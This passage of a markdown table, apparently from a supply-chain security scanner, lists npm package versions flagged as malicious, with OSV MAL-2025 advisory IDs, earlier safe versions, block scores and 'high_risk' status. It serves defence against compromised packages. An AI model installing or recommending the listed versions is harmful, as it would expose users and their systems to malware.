| `@postman/pm-bin-linux-x64` | 1.24.5 | 1.24.2 | [MAL-2025-190903](https://osv.dev/vulnerability/MAL-2025-190903) | BLOCK (21) | high_risk |
| `@postman/pm-bin-macos-arm64` | 1.24.3 | 1.24.2 | [MAL-2025-190904](https://osv.dev/vulnerability/MAL-2025-190904) | BLOCK (22) | high_risk |
| `@postman/pm-bin-macos-arm64` | 1.24.4 | 1.24.2 | [MAL-2025-190904](https://osv.dev/vulnerability/MAL-2025-190904) | BLOCK (21) | high_risk |
| `@postman/pm-bin-macos-arm64` | 1.24.5 | 1.24.2 | [MAL-2025-190904](https://osv.dev/vulnerability/MAL-2025-190904) | BLOCK (21) | high_risk |
| `@postman/pm-bin-macos-x64` | 1.24.3 | 1.24.2 | [MAL-2025-190905](https://osv.dev/vulnerability/MAL-2025-190905) | BLOCK (22) | high_risk |
| `@postman/pm-bin-macos-x64` | 1.24.4 | 1.24.2 | [MAL-2025-190905](https://osv.dev/vulnerability/MAL-2025-190905) | BLOCK (21) | high_risk |
| `@postman/pm-bin-macos-x64` | 1.24.5 | 1.24.2 | [MAL-2025-190905](https://osv.dev/vulnerability/MAL-2025-190905) | BLOCK (21) | high_risk |
| `@postman/pm-bin-windows-x64` | 1.24.3 | 1.24.2 | [MAL-2025-190906](https://osv.dev/vulnerability/MAL-2025-190906) | BLOCK (22) | high_risk |
| `@postman/pm-bin-windows-x64` | 1.24.4 | 1.24.2 | [MAL-2025-190906](https://osv.dev/vulnerability/MAL-2025-190906) | BLOCK (21) | high_risk |
| `@postman/pm-bin-windows-x64` | 1.24.5 | 1.24.2 | [MAL-2025-190906](https://osv.dev/vulnerability/MAL-2025-190906) | BLOCK (21) | high_risk |
| `@postman/postman-collection-fork` | 4.3.3 | 4.3.2 | [MAL-2025-190907](https://osv.dev/vulnerability/MAL-2025-190907) | BLOCK (21) | high_risk |
| `@postman/postman-collection-fork` | 4.3.4 | 4.3.2 | [MAL-2025-190907](https://osv.dev/vulnerability/MAL-2025-190907) | BLOCK (20) | high_risk |
| `@postman/postman-collection-fork` | 4.3.5 | 4.3.2 | [MAL-2025-190907](https://osv.dev/vulnerability/MAL-2025-190907) | BLOCK (20) | high_risk |
| `@postman/postman-mcp-cli` | 1.0.3 | 1.0.2 | [MAL-2025-190908](https://osv.dev/vulnerability/MAL-2025-190908) | BLOCK (21) | high_risk |
| `@postman/postman-mcp-cli` | 1.0.4 | 1.0.2 | [MAL-2025-190908](https://osv.dev/vulnerability/MAL-2025-190908) | BLOCK (20) | high_risk |
| `@postman/postman-mcp-server` | 2.4.11 | 2.4.9 | [MAL-2025-190909](https://osv.dev/vulnerability/MAL-2025-190909) | BLOCK (23) | high_risk |
| `@postman/postman-mcp-server` | 2.4.12 | 2.4.9 | [MAL-2025-190909](https://osv.dev/vulnerability/MAL-2025-190909) | BLOCK (23) | high_risk |
| `@postman/pretty-ms` | 6.1.1 | 6.1.0 | [MAL-2025-190910](https://osv.dev/vulnerability/MAL-2025-190910) | BLOCK (22) | high_risk |
| `@postman/pretty-ms` | 6.1.2 | 6.1.0 | [MAL-2025-190910](https://osv.dev/vulnerability/MAL-2025-190910) | BLOCK (21) | high_risk |
| `@postman/pretty-ms` | 6.1.3 | 6.1.0 | [MAL-2025-190910](https://osv.dev/vulnerability/MAL-2025-190910) | BLOCK (21) | high_risk |
| `@postman/tunnel-agent` | 0.6.5 | 0.6.4 | [MAL-2025-190647](https://osv.dev/vulnerability/MAL-2025-190647) | BLOCK (22) | high_risk |
| `@postman/tunnel-agent` | 0.6.6 | 0.6.4 | [MAL-2025-190647](https://osv.dev/vulnerability/MAL-2025-190647) | BLOCK (21) | high_risk |
| `@postman/wdio-allure-reporter` | 0.0.7 | 0.0.6 | [MAL-2025-190912](https://osv.dev/vulnerability/MAL-2025-190912) | BLOCK (22) | high_risk |
| `@postman/wdio-allure-reporter` | 0.0.8 | 0.0.6 | [MAL-2025-190912](https://osv.dev/vulnerability/MAL-2025-190912) | BLOCK (21) | high_risk |
| `@postman/wdio-allure-reporter` | 0.0.9 | 0.0.6 | [MAL-2025-190912](https://osv.dev/vulnerability/MAL-2025-190912) | BLOCK (21) | high_risk |
| `@postman/wdio-junit-reporter` | 0.0.4 | 0.0.3 | [MAL-2025-190913](https://osv.dev/vulnerability/MAL-2025-190913) | BLOCK (22) | high_risk |
| `@postman/wdio-junit-reporter` | 0.0.5 | 0.0.3 | [MAL-2025-190913](https://osv.dev/vulnerability/MAL-2025-190913) | BLOCK (21) | high_risk |
| `@postman/wdio-junit-reporter` | 0.0.6 | 0.0.3 | [MAL-2025-190913](https://osv.dev/vulnerability/MAL-2025-190913) | BLOCK (21) | high_risk |
| `@pradhumngautam/common-app` | 1.0.2 | 1.0.1 | [MAL-2025-191048](https://osv.dev/vulnerability/MAL-2025-191048) | BLOCK (21) | high_risk |
| `@pruthvi21/use-debounce` | 1.0.3 | 1.0.2 | [MAL-2025-191049](https://osv.dev/vulnerability/MAL-2025-191049) | BLOCK (21) | high_risk |
| `@quick-start-soft/quick-document-translator` | 1.4.2511142126 | 1.4.2511142125 | [MAL-2025-190819](https://osv.dev/vulnerability/MAL-2025-190819) | BLOCK (21) | high_risk |
| `@quick-start-soft/quick-git-clean-markdown` | 1.4.2511142126 | 1.4.2511142125 | [MAL-2025-190820](https://osv.dev/vulnerability/MAL-2025-190820) | BLOCK (20) | high_risk |
| `@quick-start-soft/quick-markdown` | 1.4.2511142126 | 1.4.2511142125 | [MAL-2025-190821](https://osv.dev/vulnerability/MAL-2025-190821) | BLOCK (21) | high_risk |
| `@quick-start-soft/quick-markdown-compose` | 1.4.2506300029 | 1.4.2506300028 | [MAL-2025-190822](https://osv.dev/vulnerability/MAL-2025-190822) | BLOCK (21) | high_risk |
| `@quick-start-soft/quick-markdown-image` | 1.4.2511142126 | 1.4.2511142125 | [MAL-2025-190823](https://osv.dev/vulnerability/MAL-2025-190823) | BLOCK (21) | high_risk |
| `@quick-start-soft/quick-markdown-print` | 1.4.2511142126 | 1.4.2511142125 | [MAL-2025-191306](https://osv.dev/vulnerability/MAL-2025-191306) | BLOCK (20) | high_risk |
| `@quick-start-soft/quick-markdown-translator` | 1.4.2509202331 | 1.4.2509202330 | [MAL-2025-191307](https://osv.dev/vulnerability/MAL-2025-191307) | BLOCK (21) | high_risk |
| `@quick-start-soft/quick-remove-image-background` | 1.4.2511142126 | 1.4.2511142125 | [MAL-2025-191308](https://osv.dev/vulnerability/MAL-2025-191308) | BLOCK (21) | high_risk |
| `@quick-start-soft/quick-task-refine` | 1.4.2511142126 | 1.4.2511142125 | [MAL-2025-190824](https://osv.dev/vulnerability/MAL-2025-190824) | BLOCK (21) | high_risk |
| `@seezo/sdr-mcp-server` | 0.0.5 | 0.0.4 | [MAL-2025-191053](https://osv.dev/vulnerability/MAL-2025-191053) | BLOCK (21) | high_risk |
| `@seung-ju/next` | 0.0.2 | 0.0.1 | [MAL-2025-190755](https://osv.dev/vulnerability/MAL-2025-190755) | BLOCK (21) | high_risk |
| `@seung-ju/openapi-generator` | 0.0.4 | 0.0.3 | [MAL-2025-190756](https://osv.dev/vulnerability/MAL-2025-190756) | BLOCK (21) | high_risk |
| `@seung-ju/react-hooks` | 0.0.2 | 0.0.1 | [MAL-2025-190757](https://osv.dev/vulnerability/MAL-2025-190757) | BLOCK (21) | high_risk |
| `@seung-ju/react-native-action-sheet` | 0.2.1 | 0.2.0 | [MAL-2025-190915](https://osv.dev/vulnerability/MAL-2025-190915) | BLOCK (21) | high_risk |
| `@strapbuild/react-native-date-time-picker` | 2.0.4 | 2.0.3 | [MAL-2025-190825](https://osv.dev/vulnerability/MAL-2025-190825) | BLOCK (21) | high_risk |
| `@strapbuild/react-native-perspective-image-cropper` | 0.4.15 | 0.4.14 | [MAL-2025-190758](https://osv.dev/vulnerability/MAL-2025-190758) | BLOCK (21) | high_risk |
| `@strapbuild/react-native-perspective-image-cropper-2` | 0.4.7 | 0.4.6 | [MAL-2025-190826](https://osv.dev/vulnerability/MAL-2025-190826) | BLOCK (21) | high_risk |
| `@strapbuild/react-native-perspective-image-cropper-poojan31` | 0.4.6 | 0.4.5 | [MAL-2025-190827](https://osv.dev/vulnerability/MAL-2025-190827) | BLOCK (21) | high_risk |
| `@trpc-rate-limiter/cloudflare` | 0.1.4 | 0.1.3 | [MAL-2025-191327](https://osv.dev/vulnerability/MAL-2025-191327) | BLOCK (21) | high_risk |
| `@trpc-rate-limiter/hono` | 0.1.4 | 0.1.3 | [MAL-2025-191328](https://osv.dev/vulnerability/MAL-2025-191328) | BLOCK (21) | high_risk |
| `@vishadtyagi/full-year-calendar` | 0.1.11 | 0.1.10 | [MAL-2025-191330](https://osv.dev/vulnerability/MAL-2025-191330) | BLOCK (21) | high_risk |
| `@voiceflow/alexa-types` | 2.15.60 | 2.15.59 | [MAL-2025-191331](https://osv.dev/vulnerability/MAL-2025-191331) | BLOCK (22) | high_risk |
| `@voiceflow/alexa-types` | 2.15.61 | 2.15.59 | [MAL-2025-191331](https://osv.dev/vulnerability/MAL-2025-191331) | BLOCK (21) | high_risk |
| `@voiceflow/api-sdk` | 3.28.58 | 3.28.57 | [MAL-2025-191333](https://osv.dev/vulnerability/MAL-2025-191333) | BLOCK (22) | high_risk |
| `@voiceflow/api-sdk` | 3.28.59 | 3.28.57 | [MAL-2025-191333](https://osv.dev/vulnerability/MAL-2025-191333) | BLOCK (21) | high_risk |
| `@voiceflow/backend-utils` | 5.0.1 | 5.0.0 | [MAL-2025-191334](https://osv.dev/vulnerability/MAL-2025-191334) | BLOCK (22) | high_risk |
| `@voiceflow/backend-utils` | 5.0.2 | 5.0.0 | [MAL-2025-191334](https://osv.dev/vulnerability/MAL-2025-191334) | BLOCK (21) | high_risk |
| `@voiceflow/base-types` | 2.136.3 | 2.136.1 | [MAL-2025-191335](https://osv.dev/vulnerability/MAL-2025-191335) | BLOCK (21) | high_risk |
| `@voiceflow/chat-types` | 2.14.58 | 2.14.57 | [MAL-2025-191337](https://osv.dev/vulnerability/MAL-2025-191337) | BLOCK (22) | high_risk |
| `@voiceflow/chat-types` | 2.14.59 | 2.14.57 | [MAL-2025-191337](https://osv.dev/vulnerability/MAL-2025-191337) | BLOCK (21) | high_risk |
| `@voiceflow/common` | 8.9.1 | 8.9.0 | [MAL-2025-191340](https://osv.dev/vulnerability/MAL-2025-191340) | BLOCK (21) | high_risk |
| `@voiceflow/common` | 8.9.2 | 8.9.0 | [MAL-2025-191340](https://osv.dev/vulnerability/MAL-2025-191340) | BLOCK (20) | high_risk |
| `@voiceflow/dependency-cruiser-config` | 1.8.11 | 1.8.10 | [MAL-2025-191342](https://osv.dev/vulnerability/MAL-2025-191342) | BLOCK (22) | high_risk |
| `@voiceflow/dependency-cruiser-config` | 1.8.12 | 1.8.10 | [MAL-2025-191342](https://osv.dev/vulnerability/MAL-2025-191342) | BLOCK (21) | high_risk |
| `@voiceflow/dtos-interact` | 1.40.2 | 1.40.0 | [MAL-2025-191343](https://osv.dev/vulnerability/MAL-2025-191343) | BLOCK (21) | high_risk |
| `@voiceflow/encryption` | 0.3.2 | 0.3.1 | [MAL-2025-191344](https://osv.dev/vulnerability/MAL-2025-191344) | BLOCK (22) | high_risk |
| `@voiceflow/encryption` | 0.3.3 | 0.3.1 | [MAL-2025-191344](https://osv.dev/vulnerability/MAL-2025-191344) | BLOCK (21) | high_risk |
| `@voiceflow/eslint-plugin` | 1.6.2 | 1.6.0 | [MAL-2025-191346](https://osv.dev/vulnerability/MAL-2025-191346) | BLOCK (21) | high_risk |
| `@voiceflow/exception` | 1.10.1 | 1.10.0 | [MAL-2025-191347](https://osv.dev/vulnerability/MAL-2025-191347) | BLOCK (22) | high_risk |
| `@voiceflow/exception` | 1.10.2 | 1.10.0 | [MAL-2025-191347](https://osv.dev/vulnerability/MAL-2025-191347) | BLOCK (21) | high_risk |
| `@voiceflow/fetch` | 1.11.1 | 1.11.0 | [MAL-2025-191348](https://osv.dev/vulnerability/MAL-2025-191348) | BLOCK (22) | high_risk |
| `@voiceflow/fetch` | 1.11.2 | 1.11.0 | [MAL-2025-191348](https://osv.dev/vulnerability/MAL-2025-191348) | BLOCK (21) | high_risk |
| `@voiceflow/general-types` | 3.2.22 | 3.2.21 | [MAL-2025-191349](https://osv.dev/vulnerability/MAL-2025-191349) | BLOCK (22) | high_risk |
| `@voiceflow/general-types` | 3.2.23 | 3.2.21 | [MAL-2025-191349](https://osv.dev/vulnerability/MAL-2025-191349) | BLOCK (21) | high_risk |
| `@voiceflow/google-dfes-types` | 2.17.12 | 2.17.11 | [MAL-2025-191351](https://osv.dev/vulnerability/MAL-2025-191351) | BLOCK (22) | high_risk |
| `@voiceflow/google-dfes-types` | 2.17.13 | 2.17.11 | [MAL-2025-191351](https://osv.dev/vulnerability/MAL-2025-191351) | BLOCK (21) | high_risk |
| `@voiceflow/google-types` | 2.21.13 | 2.21.11 | [MAL-2025-191352](https://osv.dev/vulnerability/MAL-2025-191352) | BLOCK (21) | high_risk |
| `@voiceflow/logger` | 2.4.2 | 2.4.1 | [MAL-2025-191354](https://osv.dev/vulnerability/MAL-2025-191354) | BLOCK (22) | high_risk |
| `@voiceflow/logger` | 2.4.3 | 2.4.1 | [MAL-2025-191354](https://osv.dev/vulnerability/MAL-2025-191354) | BLOCK (21) | high_risk |
| `@voiceflow/natural-language-commander` | 0.5.3 | 0.5.1 | [MAL-2025-191356](https://osv.dev/vulnerability/MAL-2025-191356) | BLOCK (21) | high_risk |
| `@voiceflow/openai` | 3.2.3 | 3.2.1 | [MAL-2025-191363](https://osv.dev/vulnerability/MAL-2025-191363) | BLOCK (22) | high_risk |
| `@voiceflow/pino` | 6.11.3 | 6.11.2 | [MAL-2025-191364](https://osv.dev/vulnerability/MAL-2025-191364) | BLOCK (20) | high_risk |
| `@voiceflow/pino` | 6.11.4 | 6.11.2 | [MAL-2025-191364](https://osv.dev/vulnerability/MAL-2025-191364) | BLOCK (20) | high_risk |
| `@voiceflow/pino-pretty` | 4.4.2 | 4.4.0 | [MAL-2025-191365](https://osv.dev/vulnerability/MAL-2025-191365) | BLOCK (21) | high_risk |
| `@voiceflow/react-chat` | 1.65.4 | 1.65.2 | [MAL-2025-191367](https://osv.dev/vulnerability/MAL-2025-191367) | BLOCK (20) | high_risk |
| `@voiceflow/runtime` | 1.29.1 | 1.29.0 | [MAL-2025-191368](https://osv.dev/vulnerability/MAL-2025-191368) | BLOCK (21) | high_risk |
| `@voiceflow/runtime` | 1.29.2 | 1.29.0 | [MAL-2025-191368](https://osv.dev/vulnerability/MAL-2025-191368) | BLOCK (20) | high_risk |
| `@voiceflow/runtime-client-js` | 1.17.2 | 1.17.1 | [MAL-2025-191369](https://osv.dev/vulnerability/MAL-2025-191369) | BLOCK (22) | high_risk |
| `@voiceflow/runtime-client-js` | 1.17.3 | 1.17.1 | [MAL-2025-191369](https://osv.dev/vulnerability/MAL-2025-191369) | BLOCK (21) | high_risk |
| `@voiceflow/sdk-runtime` | 1.43.1 | 1.43.0 | [MAL-2025-191370](https://osv.dev/vulnerability/MAL-2025-191370) | BLOCK (22) | high_risk |
| `@voiceflow/sdk-runtime` | 1.43.2 | 1.43.0 | [MAL-2025-191370](https://osv.dev/vulnerability/MAL-2025-191370) | BLOCK (21) | high_risk |
| `@voiceflow/slate-serializer` | 1.7.4 | 1.7.2 | [MAL-2025-191374](https://osv.dev/vulnerability/MAL-2025-191374) | BLOCK (21) | high_risk |
| `@voiceflow/stitches-react` | 2.3.2 | 2.3.1 | [MAL-2025-191375](https://osv.dev/vulnerability/MAL-2025-191375) | BLOCK (22) | high_risk |
| `@voiceflow/test-common` | 2.1.1 | 2.1.0 | [MAL-2025-191378](https://osv.dev/vulnerability/MAL-2025-191378) | BLOCK (22) | high_risk |
| `@voiceflow/test-common` | 2.1.2 | 2.1.0 | [MAL-2025-191378](https://osv.dev/vulnerability/MAL-2025-191378) | BLOCK (21) | high_risk |
| `@voiceflow/tsconfig-paths` | 1.1.4 | 1.1.3 | [MAL-2025-191380](https://osv.dev/vulnerability/MAL-2025-191380) | BLOCK (22) | high_risk |
| `@voiceflow/tsconfig-paths` | 1.1.5 | 1.1.3 | [MAL-2025-191380](https://osv.dev/vulnerability/MAL-2025-191380) | BLOCK (21) | high_risk |
| `@voiceflow/vite-config` | 2.6.2 | 2.6.1 | [MAL-2025-191383](https://osv.dev/vulnerability/MAL-2025-191383) | BLOCK (22) | high_risk |
| `@voiceflow/vite-config` | 2.6.3 | 2.6.1 | [MAL-2025-191383](https://osv.dev/vulnerability/MAL-2025-191383) | BLOCK (21) | high_risk |
| `@voiceflow/voice-types` | 2.10.58 | 2.10.57 | [MAL-2025-191385](https://osv.dev/vulnerability/MAL-2025-191385) | BLOCK (22) | high_risk |
| `@voiceflow/voice-types` | 2.10.59 | 2.10.57 | [MAL-2025-191385](https://osv.dev/vulnerability/MAL-2025-191385) | BLOCK (21) | high_risk |
| `@voiceflow/voiceflow-types` | 3.32.46 | 3.32.44 | [MAL-2025-191386](https://osv.dev/vulnerability/MAL-2025-191386) | BLOCK (21) | high_risk |
| `@zapier/ai-actions` | 0.1.19 | 0.1.17 | [MAL-2025-190830](https://osv.dev/vulnerability/MAL-2025-190830) | BLOCK (21) | high_risk |
| `@zapier/ai-actions-react` | 0.1.12 | 0.1.11 | [MAL-2025-190917](https://osv.dev/vulnerability/MAL-2025-190917) | BLOCK (21) | high_risk |
| `@zapier/ai-actions-react` | 0.1.13 | 0.1.11 | [MAL-2025-190917](https://osv.dev/vulnerability/MAL-2025-190917) | BLOCK (20) | high_risk |
| `@zapier/babel-preset-zapier` | 6.4.2 | 6.4.0 | [MAL-2025-190761](https://osv.dev/vulnerability/MAL-2025-190761) | BLOCK (21) | high_risk |
| `@zapier/browserslist-config-zapier` | 1.0.4 | 1.0.2 | [MAL-2025-190762](https://osv.dev/vulnerability/MAL-2025-190762) | BLOCK (21) | high_risk |
| `@zapier/eslint-plugin-zapier` | 11.0.3 | 11.0.2 | [MAL-2025-190763](https://osv.dev/vulnerability/MAL-2025-190763) | BLOCK (21) | high_risk |
| `@zapier/eslint-plugin-zapier` | 11.0.4 | 11.0.2 | [MAL-2025-190763](https://osv.dev/vulnerability/MAL-2025-190763) | BLOCK (21) | high_risk |
| `@zapier/mcp-integration` | 3.0.1 | 3.0.0 | [MAL-2025-190918](https://osv.dev/vulnerability/MAL-2025-190918) | BLOCK (19) | high_risk |
| `@zapier/mcp-integration` | 3.0.2 | 3.0.0 | [MAL-2025-190918](https://osv.dev/vulnerability/MAL-2025-190918) | BLOCK (19) | high_risk |
| `@zapier/secret-scrubber` | 1.1.4 | 1.1.2 | [MAL-2025-190691](https://osv.dev/vulnerability/MAL-2025-190691) | BLOCK (21) | high_risk |
| `@zapier/spectral-api-ruleset` | 1.9.2 | 1.9.0 | [MAL-2025-190919](https://osv.dev/vulnerability/MAL-2025-190919) | BLOCK (21) | high_risk |
| `@zapier/stubtree` | 0.1.2 | 0.1.1 | [MAL-2025-190920](https://osv.dev/vulnerability/MAL-2025-190920) | BLOCK (21) | high_risk |
| `@zapier/stubtree` | 0.1.3 | 0.1.1 | [MAL-2025-190920](https://osv.dev/vulnerability/MAL-2025-190920) | BLOCK (20) | high_risk |
| `@zapier/zapier-sdk` | 0.15.5 | 0.15.4 | [MAL-2025-190648](https://osv.dev/vulnerability/MAL-2025-190648) | BLOCK (21) | high_risk |
| `@zapier/zapier-sdk` | 0.15.6 | 0.15.4 | [MAL-2025-190648](https://osv.dev/vulnerability/MAL-2025-190648) | BLOCK (21) | high_risk |
| `ai-crowl-shield` | 1.0.7 | 1.0.6 | [MAL-2025-191063](https://osv.dev/vulnerability/MAL-2025-191063) | BLOCK (21) | high_risk |
| `asyncapi-preview` | 1.0.1 | 1.0.0 | [MAL-2025-190831](https://osv.dev/vulnerability/MAL-2025-190831) | BLOCK (21) | high_risk |
| `automation_model` | 1.0.491 | 1.0.490 | [MAL-2025-191066](https://osv.dev/vulnerability/MAL-2025-191066) | BLOCK (20) | high_risk |
| `axios-builder` | 1.2.1 | 1.2.0 | [MAL-2025-190832](https://osv.dev/vulnerability/MAL-2025-190832) | BLOCK (21) | high_risk |
| `axios-timed` | 1.0.2 | 1.0.0 | [MAL-2025-191068](https://osv.dev/vulnerability/MAL-2025-191068) | BLOCK (21) | high_risk |
| `best_gpio_controller` | 1.0.10 | 1.0.9 | [MAL-2025-191072](https://osv.dev/vulnerability/MAL-2025-191072) | BLOCK (21) | high_risk |
| `bytecode-checker-cli` | 1.0.10 | 1.0.7 | [MAL-2025-190833](https://osv.dev/vulnerability/MAL-2025-190833) | BLOCK (21) | high_risk |
| `bytecode-checker-cli` | 1.0.9 | 1.0.7 | [MAL-2025-190833](https://osv.dev/vulnerability/MAL-2025-190833) | BLOCK (21) | high_risk |
| `calc-loan-interest` | 1.0.4 | 1.0.3 | [MAL-2025-190834](https://osv.dev/vulnerability/MAL-2025-190834) | BLOCK (22) | high_risk |
| `chrome-extension-downloads` | 0.0.4 | 0.0.2 | [MAL-2025-191081](https://osv.dev/vulnerability/MAL-2025-191081) | BLOCK (21) | high_risk |
| `claude-token-updater` | 1.0.3 | 1.0.2 | [MAL-2025-190837](https://osv.dev/vulnerability/MAL-2025-190837) | BLOCK (20) | high_risk |
| `coinmarketcap-api` | 3.1.2 | 3.1.1 | [MAL-2025-190948](https://osv.dev/vulnerability/MAL-2025-190948) | BLOCK (21) | high_risk |
| `coinmarketcap-api` | 3.1.3 | 3.1.1 | [MAL-2025-190948](https://osv.dev/vulnerability/MAL-2025-190948) | BLOCK (21) | high_risk |
| `colors-regex` | 2.0.1 | 2.0.0 | [MAL-2025-190949](https://osv.dev/vulnerability/MAL-2025-190949) | BLOCK (21) | high_risk |
| `command-irail` | 0.5.4 | 0.5.3 | [MAL-2025-191391](https://osv.dev/vulnerability/MAL-2025-191391) | BLOCK (21) | high_risk |
| `compare-obj` | 1.1.1 | 1.1.0 | [MAL-2025-190950](https://osv.dev/vulnerability/MAL-2025-190950) | BLOCK (21) | high_risk |
| `compare-obj` | 1.1.2 | 1.1.0 | [MAL-2025-190950](https://osv.dev/vulnerability/MAL-2025-190950) | BLOCK (21) | not scanned |
| `create-director-app` | 0.1.1 | 0.1.0 | [MAL-2025-191082](https://osv.dev/vulnerability/MAL-2025-191082) | BLOCK (22) | high_risk |
| `create-glee-app` | 0.2.3 | 0.2.1 | [MAL-2025-190767](https://osv.dev/vulnerability/MAL-2025-190767) | BLOCK (18) | high_risk |
| `create-hardhat3-app` | 1.1.2 | 1.1.0 | [MAL-2025-190839](https://osv.dev/vulnerability/MAL-2025-190839) | BLOCK (21) | high_risk |
| `create-hardhat3-app` | 1.1.3 | 1.1.0 | [MAL-2025-190839](https://osv.dev/vulnerability/MAL-2025-190839) | BLOCK (21) | high_risk |
| `create-mcp-use-app` | 0.5.3 | 0.5.2 | [MAL-2025-190922](https://osv.dev/vulnerability/MAL-2025-190922) | BLOCK (20) | high_risk |
| `create-mcp-use-app` | 0.5.4 | 0.5.2 | [MAL-2025-190922](https://osv.dev/vulnerability/MAL-2025-190922) | BLOCK (20) | high_risk |
| `designstudiouiux` | 1.0.1 | 1.0.0 | [MAL-2025-190955](https://osv.dev/vulnerability/MAL-2025-190955) | BLOCK (21) | high_risk |
| `discord-bot-server` | 0.1.2 | 0.1.1 | [MAL-2025-190769](https://osv.dev/vulnerability/MAL-2025-190769) | BLOCK (22) | high_risk |
| `docusaurus-plugin-vanilla-extract` | 1.0.3 | 1.0.2 | [MAL-2025-190956](https://osv.dev/vulnerability/MAL-2025-190956) | BLOCK (21) | high_risk |
| `dotnet-template` | 0.0.3 | 0.0.2 | [MAL-2025-190770](https://osv.dev/vulnerability/MAL-2025-190770) | BLOCK (21) | high_risk |
| `email-deliverability-tester` | 1.1.1 | 1.1.0 | [MAL-2025-190958](https://osv.dev/vulnerability/MAL-2025-190958) | BLOCK (21) | high_risk |
| `eslint-config-zeallat-base` | 1.0.4 | 1.0.3 | [MAL-2025-190772](https://osv.dev/vulnerability/MAL-2025-190772) | BLOCK (21) | high_risk |
| `evm-checkcode-cli` | 1.0.13 | 1.0.11 | [MAL-2025-190841](https://osv.dev/vulnerability/MAL-2025-190841) | BLOCK (21) | high_risk |
| `evm-checkcode-cli` | 1.0.14 | 1.0.11 | [MAL-2025-190841](https://osv.dev/vulnerability/MAL-2025-190841) | BLOCK (21) | high_risk |
| `exact-ticker` | 0.3.5 | 0.3.4 | [MAL-2025-190697](https://osv.dev/vulnerability/MAL-2025-190697) | BLOCK (21) | high_risk |
| `fat-fingered` | 1.0.2 | 1.0.0 | [MAL-2025-191090](https://osv.dev/vulnerability/MAL-2025-191090) | BLOCK (21) | high_risk |
| `feature-flip` | 1.0.2 | 1.0.0 | [MAL-2025-191091](https://osv.dev/vulnerability/MAL-2025-191091) | BLOCK (21) | high_risk |
| `fittxt` | 1.0.3 | 1.0.1 | [MAL-2025-191093](https://osv.dev/vulnerability/MAL-2025-191093) | BLOCK (21) | high_risk |
| `gate-evm-check-code2` | 2.0.4 | 2.0.2 | [MAL-2025-190843](https://osv.dev/vulnerability/MAL-2025-190843) | BLOCK (21) | high_risk |
| `gate-evm-check-code2` | 2.0.5 | 2.0.2 | [MAL-2025-190843](https://osv.dev/vulnerability/MAL-2025-190843) | BLOCK (21) | high_risk |
| `gate-evm-check-code2` | 2.0.6 | 2.0.2 | [MAL-2025-190843](https://osv.dev/vulnerability/MAL-2025-190843) | BLOCK (21) | high_risk |
| `gate-evm-tools-test` | 1.0.6 | 1.0.4 | [MAL-2025-190844](https://osv.dev/vulnerability/MAL-2025-190844) | BLOCK (21) | high_risk |
| `gate-evm-tools-test` | 1.0.7 | 1.0.4 | [MAL-2025-190844](https://osv.dev/vulnerability/MAL-2025-190844) | BLOCK (21) | high_risk |
| `generator-ng-itobuz` | 0.0.15 | 0.0.14 | [MAL-2025-191102](https://osv.dev/vulnerability/MAL-2025-191102) | BLOCK (21) | high_risk |
| `github-action-for-generator` | 2.1.27 | 2.1.26 | [MAL-2025-190845](https://osv.dev/vulnerability/MAL-2025-190845) | BLOCK (21) | high_risk |
| `gitsafe` | 1.0.5 | 1.0.4 | [MAL-2025-191104](https://osv.dev/vulnerability/MAL-2025-191104) | BLOCK (20) | high_risk |
| `go-template` | 0.1.9 | 0.1.7 | [MAL-2025-190846](https://osv.dev/vulnerability/MAL-2025-190846) | BLOCK (21) | high_risk |
| `hope-mapboxdraw` | 0.1.1 | 0.1.0 | [MAL-2025-190963](https://osv.dev/vulnerability/MAL-2025-190963) | BLOCK (21) | high_risk |
| `hopedraw` | 1.0.3 | 1.0.2 | [MAL-2025-190964](https://osv.dev/vulnerability/MAL-2025-190964) | BLOCK (21) | high_risk |
| `hover-design-prototype` | 0.0.5 | 0.0.4 | [MAL-2025-190965](https://osv.dev/vulnerability/MAL-2025-190965) | BLOCK (21) | high_risk |
| `ids-css` | 1.5.1 | 1.5.0 | [MAL-2025-191106](https://osv.dev/vulnerability/MAL-2025-191106) | BLOCK (22) | high_risk |
| `ids-enterprise-mcp-server` | 0.0.2 | 0.0.1 | [MAL-2025-191107](https://osv.dev/vulnerability/MAL-2025-191107) | BLOCK (21) | high_risk |
| `ids-enterprise-typings` | 20.1.6 | 20.1.5 | [MAL-2025-191109](https://osv.dev/vulnerability/MAL-2025-191109) | BLOCK (21) | high_risk |
| `iron-shield-miniapp` | 0.0.2 | 0.0.1 | [MAL-2025-190773](https://osv.dev/vulnerability/MAL-2025-190773) | BLOCK (21) | high_risk |
| `ito-button` | 8.0.3 | 8.0.2 | [MAL-2025-190970](https://osv.dev/vulnerability/MAL-2025-190970) | BLOCK (21) | high_risk |
| `itobuz-angular` | 0.0.1 | 0.0.0 | [MAL-2025-190971](https://osv.dev/vulnerability/MAL-2025-190971) | BLOCK (21) | high_risk |
| `itobuz-angular-button` | 8.0.11 | 8.0.10 | [MAL-2025-190973](https://osv.dev/vulnerability/MAL-2025-190973) | BLOCK (21) | high_risk |
| `jaetut-varit-test` | 1.0.2 | 1.0.1 | [MAL-2025-191112](https://osv.dev/vulnerability/MAL-2025-191112) | BLOCK (21) | high_risk |
| `jquery-bindings` | 1.1.2 | 1.1.1 | [MAL-2025-191113](https://osv.dev/vulnerability/MAL-2025-191113) | BLOCK (21) | high_risk |
| `jquery-bindings` | 1.1.3 | 1.1.1 | [MAL-2025-191113](https://osv.dev/vulnerability/MAL-2025-191113) | BLOCK (21) | high_risk |
| `jsonsurge` | 1.0.7 | 1.0.6 | [MAL-2025-191114](https://osv.dev/vulnerability/MAL-2025-191114) | BLOCK (21) | high_risk |
| `kill-port` | 2.0.3 | 2.0.1 | [MAL-2025-191116](https://osv.dev/vulnerability/MAL-2025-191116) | BLOCK (21) | high_risk |
| `korea-administrative-area-geo-json-util` | 1.0.7 | 1.0.6 | [MAL-2025-190774](https://osv.dev/vulnerability/MAL-2025-190774) | BLOCK (21) | high_risk |
| `kwami` | 1.5.10 | 1.5.8 | [MAL-2025-191121](https://osv.dev/vulnerability/MAL-2025-191121) | BLOCK (21) | high_risk |
| `lang-codes` | 1.0.2 | 1.0.0 | [MAL-2025-191122](https://osv.dev/vulnerability/MAL-2025-191122) | BLOCK (21) | high_risk |
| `manual-billing-system-miniapp-api` | 1.3.1 | 1.3.0 | [MAL-2025-190775](https://osv.dev/vulnerability/MAL-2025-190775) | BLOCK (21) | high_risk |
| `mcp-use` | 1.4.2 | 1.4.1 | [MAL-2025-190923](https://osv.dev/vulnerability/MAL-2025-190923) | BLOCK (20) | high_risk |
